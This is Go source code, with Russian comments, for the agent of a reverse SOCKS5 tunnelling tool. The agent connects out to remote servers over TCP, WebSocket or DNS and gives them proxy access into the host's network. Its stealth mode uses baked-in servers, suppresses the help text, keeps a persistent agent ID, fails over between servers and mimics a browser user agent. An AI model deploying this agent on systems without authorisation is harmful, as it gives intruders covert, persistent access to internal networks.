package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	socks5 "github.com/armon/go-socks5"
	"github.com/kost/revsocks/internal/agent"
	"github.com/kost/revsocks/internal/common"
	"github.com/kost/revsocks/internal/dns"
	"github.com/kost/revsocks/internal/transport"
)

// ========================================
// Graceful Shutdown
// ========================================

var globalCtx context.Context
var globalCancel context.CancelFunc

func setupSignalHandler() {
	globalCtx, globalCancel = context.WithCancel(context.Background())

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	go func() {
		sig := <-sigChan
		log.Printf("Received signal %v, initiating graceful shutdown...", sig)
		globalCancel()

		time.Sleep(2 * time.Second)
		log.Println("Shutdown complete")
		os.Exit(0)
	}()
}

// ========================================
// Options
// ========================================

type AppOptions struct {
	connect           string
	proxy             string
	password          string
	proxyauthstring   string
	proxytimeout      string
	useragent         string
	usetls            bool
	verify            bool
	usewebsocket      bool
	debug             bool
	quiet             bool
	reconnectCount    int
	reconnectInterval int
	fullCyclePause    int
	yamuxKeepalive    int
	yamuxTimeout      int
	// DNS mode
	dnsdomain string
	dnsdelay  string
	// SOCKS5 auth
	socksAuthEnabled bool
	socksAuthUser    string
	socksAuthPass    string
	// Agent ID
	agentID     string
	agentIDPath string // Путь к файлу с persistent ID
}

// parseProxyAuth парсит строку формата "domain/user:pass" или "user:pass"
func parseProxyAuth(authStr string) (domain, user, pass string, err error) {
	if authStr == "" {
		return "", "", "", nil
	}

	var userPass string
	if strings.Contains(authStr, "/") {
		parts := strings.SplitN(authStr, "/", 2)
		if len(parts) != 2 {
			return "", "", "", fmt.Errorf("invalid proxyauth format: missing user:pass after domain")
		}
		domain = parts[0]
		userPass = parts[1]
	} else {
		userPass = authStr
	}

	parts := strings.SplitN(userPass, ":", 2)
	if len(parts) != 2 {
		return "", "", "", fmt.Errorf("invalid proxyauth format: expected user:pass, got %q", userPass)
	}

	return domain, parts[0], parts[1], nil
}

// ========================================
// Failover State (для stealth режима)
// ========================================

type failoverState struct {
	servers        []string
	currentIdx     int
	attempts       int
	retryCount     int
	fullCyclePause int
}

func (f *failoverState) getNextServer() string {
	if len(f.servers) == 0 {
		return ""
	}

	if f.attempts >= f.retryCount {
		f.currentIdx = (f.currentIdx + 1) % len(f.servers)
		f.attempts = 0
		if f.currentIdx == 0 && f.fullCyclePause > 0 {
			log.Printf("Full cycle completed, waiting %d sec...", f.fullCyclePause)
			time.Sleep(time.Duration(f.fullCyclePause) * time.Second)
		}
	}
	f.attempts++
	return f.servers[f.currentIdx]
}

// resetAttempts сбрасывает счетчик попыток при успешном подключении
// Это предотвращает ложное переключение на backup после разрыва рабочего туннеля
func (f *failoverState) resetAttempts() {
	f.attempts = 0
}

// getCurrentServerName возвращает имя текущего сервера для логов
func (f *failoverState) getCurrentServerName() string {
	if len(f.servers) == 0 {
		return "none"
	}
	return f.servers[f.currentIdx]
}

func main() {
	var opts AppOptions

	// ========================================
	// Проверяем BakedConfig (stealth режим)
	// ========================================
	bakedCfg := agent.GetBakedConfig()
	isStealth := bakedCfg != nil

	// Дефолты из baked конфига (если есть)
	defaultConnect := ""
	defaultPassword := ""
	defaultTLS := false
	defaultQuiet := false
	defaultRecn := 3
	defaultRect := 30
	defaultFullCyclePause := 7200
	defaultYamuxKeepalive := 30
	defaultYamuxTimeout := 10
	defaultSocksAuthEnabled := false
	defaultSocksAuthUser := ""
	defaultSocksAuthPass := ""
	defaultWebsocket := false
	defaultVerify := false

	if isStealth {
		// Берём дефолты из baked конфига
		if len(bakedCfg.Servers) > 0 {
			defaultConnect = bakedCfg.Servers[0]
		}
		defaultPassword = bakedCfg.Password
		defaultTLS = bakedCfg.TLSEnabled
		defaultWebsocket = bakedCfg.UseWebsocket
		defaultVerify = bakedCfg.Verify
		defaultQuiet = bakedCfg.QuietMode
		defaultRecn = bakedCfg.RetryCount
		defaultRect = bakedCfg.RetryInterval
		defaultFullCyclePause = bakedCfg.FullCyclePause
		defaultYamuxKeepalive = bakedCfg.YamuxKeepalive
		defaultYamuxTimeout = bakedCfg.YamuxTimeout
		defaultSocksAuthEnabled = bakedCfg.SocksAuthEnabled
		defaultSocksAuthUser = bakedCfg.SocksAuthUser
		defaultSocksAuthPass = bakedCfg.SocksAuthPass
	}

	// ========================================
	// Флаги командной строки
	// ========================================

	// Основные флаги
	flag.StringVar(&opts.connect, "connect", defaultConnect, "connect address:port (or https://address:port for ws)")
	flag.StringVar(&opts.proxy, "proxy", "", "use proxy address:port for connecting")
	flag.StringVar(&opts.password, "pass", defaultPassword, "Connect password")
	flag.StringVar(&opts.proxyauthstring, "proxyauth", "", "proxy auth Domain/user:Password")
	flag.StringVar(&opts.proxytimeout, "proxytimeout", "", "proxy response timeout (ms)")
	flag.StringVar(&opts.useragent, "agent", "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko", "User agent to use")

	// TLS
	flag.BoolVar(&opts.usetls, "tls", defaultTLS, "use TLS for connection")
	flag.BoolVar(&opts.verify, "verify", defaultVerify, "verify TLS connection")
	flag.BoolVar(&opts.usewebsocket, "ws", defaultWebsocket, "use websocket for connection")

	// Reconnect
	flag.IntVar(&opts.reconnectCount, "recn", defaultRecn, "reconnection limit (0 = unlimited)")
	flag.IntVar(&opts.reconnectInterval, "rect", defaultRect, "reconnection delay in seconds")
	flag.IntVar(&opts.fullCyclePause, "fullpause", defaultFullCyclePause, "pause after full failover cycle (seconds)")

	// Yamux tuning
	flag.IntVar(&opts.yamuxKeepalive, "yamux-keepalive", defaultYamuxKeepalive, "yamux keepalive interval in seconds")
	flag.IntVar(&opts.yamuxTimeout, "yamux-timeout", defaultYamuxTimeout, "yamux write timeout in seconds")

	// SOCKS5 auth
	flag.BoolVar(&opts.socksAuthEnabled, "socks-auth", defaultSocksAuthEnabled, "enable SOCKS5 authentication")
	flag.StringVar(&opts.socksAuthUser, "socks-user", defaultSocksAuthUser, "SOCKS5 auth username")
	flag.StringVar(&opts.socksAuthPass, "socks-pass", defaultSocksAuthPass, "SOCKS5 auth password")

	// DNS mode
	flag.StringVar(&opts.dnsdomain, "dns", "", "DNS domain to use for DNS tunneling")
	flag.StringVar(&opts.dnsdelay, "dnsdelay", "", "Delay/sleep time between DNS requests")

	// Agent management
	flag.StringVar(&opts.agentIDPath, "agentid-path", "", "Path to persistent agent ID file (default: ~/.revsocks.id)")

	// Misc
	flag.BoolVar(&opts.debug, "debug", false, "display debug info")
	flag.BoolVar(&opts.quiet, "q", defaultQuiet, "Be quiet - do not display output")
	version := flag.Bool("version", false, "version information")

	// В stealth режиме отключаем help
	if isStealth {
		flag.Usage = func() {
			os.Exit(1)
		}
	} else {
		flag.Usage = func() {
			fmt.Printf("revsocks-agent - reverse socks5 client %s (%s)\n", common.Version, common.CommitID)
			fmt.Println("")
			flag.PrintDefaults()
			fmt.Println("")
			fmt.Println("Usage (standard tcp):")
			fmt.Println("  revsocks-agent -connect server:8080 -pass test -tls")
			fmt.Println("")
			fmt.Println("Usage (dns tunneling):")
			fmt.Println("  revsocks-agent -dns example.com -pass <key>")
		}
	}

	flag.Parse()

	// Обновляем yamux конфигурацию
	transport.GlobalYamuxSettings.UpdateSettings(opts.yamuxKeepalive, opts.yamuxTimeout)

	// Инициализируем signal handler
	setupSignalHandler()

	if opts.quiet {
		log.SetOutput(io.Discard)
	}

	if *version {
		fmt.Printf("revsocks-agent - reverse socks5 client %s (%s)\n", common.Version, common.CommitID)
		if isStealth {
			fmt.Println("Mode: STEALTH (baked config)")
		}
		os.Exit(0)
	}

	// Лог режима
	if isStealth {
		log.Printf("Running in STEALTH mode (baked config with %d servers)", len(bakedCfg.Servers))
	}

	// Генерируем пароль если не указан
	if opts.password == "" {
		opts.password = common.RandString(64)
		log.Printf("No password specified. Generated password is %s", opts.password)
	}

	// ========================================
	// DNS Mode
	// ========================================
	if opts.dnsdomain != "" {
		dnskey := opts.password
		if opts.password == "" {
			dnskey = dns.GenerateKey()
			log.Printf("No password specified, generated following (recheck if same on both sides): %s", dnskey)
		}
		if len(dnskey) != 64 {
			fmt.Fprintf(os.Stderr, "Specified key of incorrect size for DNS (should be 64 in hex)\n")
			os.Exit(1)
		}

		cfg := &dns.ClientConfig{
			TargetDomain:  opts.dnsdomain,
			EncryptionKey: dnskey,
			DNSDelay:      opts.dnsdelay,
			SocksConfig:   &socks5.Config{},
		}
		log.Fatal(dns.ConnectSocks(cfg))
	}

	// ========================================
	// TCP/WebSocket Mode
	// ========================================
	if opts.connect == "" && !isStealth {
		flag.Usage()
		fmt.Fprintf(os.Stderr, "You must specify a connect address\n")
		os.Exit(1)
	}

	// Парсим proxy auth
	var proxyAuth *agent.ProxyAuthConfig
	if opts.proxyauthstring != "" {
		domain, user, pass, err := parseProxyAuth(opts.proxyauthstring)
		if err != nil {
			log.Fatalf("Proxy auth error: %v", err)
		}
		proxyAuth = &agent.ProxyAuthConfig{
			Domain:   domain,
			Username: user,
			Password: pass,
		}
		log.Printf("Using domain %s with user %s", domain, user)
	}

	// Парсим proxy timeout
	proxyTimeout := time.Millisecond * 1000
	if opts.proxytimeout != "" {
		ms, err := time.ParseDuration(opts.proxytimeout + "ms")
		if err == nil {
			proxyTimeout = ms
		}
	}

	// Загружаем или генерируем Agent ID (всегда v3 protocol)
	persistentAgentID, err := agent.LoadOrGenerateAgentID(opts.agentIDPath)
	if err != nil {
		log.Printf("Warning: Failed to load/generate agent ID: %v", err)
		// Fallback на hostname или случайный ID
		persistentAgentID = ""
	}

	// Конфигурация агента
	cfg := &agent.Config{
		Connect:          opts.connect,
		Proxy:            opts.proxy,
		Password:         opts.password,
		ProxyAuth:        proxyAuth,
		UseTLS:           opts.usetls,
		Verify:           opts.verify,
		UseWebsocket:     opts.usewebsocket,
		UserAgent:        opts.useragent,
		ProxyTimeout:     proxyTimeout,
		SocksAuthEnabled: opts.socksAuthEnabled,
		SocksAuthUser:    opts.socksAuthUser,
		SocksAuthPass:    opts.socksAuthPass,
		AgentID:          persistentAgentID,
		Debug:            opts.debug,
	}

	// ========================================
	// Stealth Mode с Failover (v3 protocol)
	// ========================================
	if isStealth && len(bakedCfg.Servers) >= 1 {
		log.Printf("Stealth mode with %d server(s) (v3 protocol)", len(bakedCfg.Servers))
		runStealthFailoverV3(cfg, bakedCfg, opts)
		return
	}

	// ========================================
	// Standard Mode (v3 protocol)
	// ========================================
	log.Printf("Starting agent (v3 protocol)")
	log.Printf("Agent ID: %s", persistentAgentID)
	
	// Проверяем WebSocket режим
	if opts.usewebsocket {
		log.Fatal(agent.ConnectWebsocket(cfg))
	} else {
		log.Fatal(agent.StartBeaconLoop(cfg))
	}
}

// runStealthFailoverV3 запускает агента с failover между серверами (v3 protocol)
// Архитектура: failover loop контролирует переключение серверов,
// TryConnect делает одну попытку, RunSession блокирует на время жизни туннеля
func runStealthFailoverV3(cfg *agent.Config, bakedCfg *agent.BakedConfig, opts AppOptions) {
	failover := &failoverState{
		servers:        bakedCfg.Servers,
		currentIdx:     0,
		attempts:       0,
		retryCount:     bakedCfg.RetryCount,
		fullCyclePause: bakedCfg.FullCyclePause,
	}

	reconnectInterval := time.Duration(opts.reconnectInterval) * time.Second
	postTunnelDelay := 5 * time.Second // Короткая пауза после разрыва туннеля

	for {
		// Проверка shutdown
		select {
		case <-globalCtx.Done():
			log.Println("Shutdown requested, stopping failover loop")
			return
		default:
		}

		// Получаем следующий сервер (с учетом failover логики)
		server := failover.getNextServer()
		cfg.Connect = server
		log.Printf("Trying server: %s (attempt %d/%d)", server, failover.attempts, failover.retryCount)

		// ОДНА попытка подключения
		if opts.usewebsocket {
			wconn, cmd, params, err := agent.TryConnectWebsocket(cfg)
			if err != nil {
				log.Printf("Connection failed: %v", err)
				// Ждём и пробуем снова (getNextServer переключит сервер после N попыток)
				sleepWithShutdown(reconnectInterval)
				continue
			}

			// Успешное подключение — сбрасываем счетчик попыток
			failover.resetAttempts()
			log.Printf("Connected to %s successfully", server)

			// Запуск сессии (блокирует до разрыва)
			err = agent.RunWebsocketSession(wconn, cfg, cmd, params)
			if err != nil {
				log.Printf("Session ended: %v", err)
			}

			// После разрыва туннеля — короткая пауза и переподключение к тому же серверу
			log.Println("Tunnel disconnected, reconnecting...")
			sleepWithShutdown(postTunnelDelay)

		} else {
			// TCP режим
			conn, cmd, params, err := agent.TryConnectTCP(cfg)
			if err != nil {
				log.Printf("Connection failed: %v", err)
				sleepWithShutdown(reconnectInterval)
				continue
			}

			// Успешное подключение
			failover.resetAttempts()
			log.Printf("Connected to %s successfully", server)

			// Запуск сессии
			err = agent.RunTCPSession(conn, cfg, cmd, params)
			if err != nil {
				log.Printf("Session ended: %v", err)
			}

			log.Println("Tunnel disconnected, reconnecting...")
			sleepWithShutdown(postTunnelDelay)
		}
	}
}

// sleepWithShutdown ожидает указанное время с проверкой shutdown
func sleepWithShutdown(duration time.Duration) {
	select {
	case <-globalCtx.Done():
		log.Println("Shutdown requested during sleep")
	case <-time.After(duration):
	}
}
